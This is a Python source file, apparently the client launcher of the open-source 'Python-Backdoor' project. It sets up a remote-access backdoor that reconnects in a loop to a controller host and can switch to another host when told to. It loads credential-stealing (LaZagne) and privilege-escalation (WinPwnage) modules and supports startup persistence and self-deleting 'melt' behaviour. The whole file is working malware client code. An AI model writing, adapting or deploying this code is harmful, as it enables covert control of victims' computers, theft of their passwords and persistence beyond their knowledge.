"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import socket
import os
import sys
import traceback

# make sure working dir is same as file dir
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# append path, needed for all 'main' files
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

from src.args import Args
from src import errors, helper

from src.definitions import platforms

from src.client.persistence.persistence import melt

if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
    from src.client.persistence.unix import Unix as Persistence
elif platforms.OS == platforms.WINDOWS:
    from src.client.persistence.windows import Windows as Persistence

    helper.init_submodule("WinPwnage")
    helper.init_submodule("LaZagne/Windows")
    helper.init_submodule("wesng")
else:
    print("Platform not supported")
    sys.exit(0)

if platforms.OS == platforms.DARWIN:
    helper.init_submodule("LaZagne/Mac")
elif platforms.OS == platforms.LINUX:
    helper.init_submodule("LaZagne/Linux")

from src.client.client import Client
from src import logger


class MainClient:
    def __init__(self, host, port, add_to_startup=False, _melt=False):
        self._args = Args(self)
        logger.init(self._args.get_args())

        # delete old file if there is one to remove
        rm = self._args.get_args().rm
        if rm and os.path.isfile(rm):
            try:
                os.remove(rm)
            except Exception:
                pass

        self.client = None
        self.host = socket.gethostbyname(host)
        self.port = port

        p = Persistence()

        try:
            if _melt:
                melt()

            if add_to_startup:
                p.add_startup()
        except (errors.ClientSocket.Persistence.StartupError, NotImplementedError):
            pass

    def start(self):
        while True:
            self.client = Client(self.host, self.port)

            try:
                self.client.connect()
            except errors.ClientSocket.ChangeConnectionDetails as host:
                host = str(host).split(":")
                self.host = socket.gethostbyname(host[0])
                self.port = int(host[1])
                del self.client
            except Exception:  # if the server closes without warning or something happens
                self.client.logger.debug(f"Error occurred, restarting. {traceback.format_exc()}")

                try:
                    self.client.es.socket.close()
                except Exception:
                    pass

                del self.client


if __name__ == "__main__":
    MainClient('127.0.0.1', 3003, False, False).start()
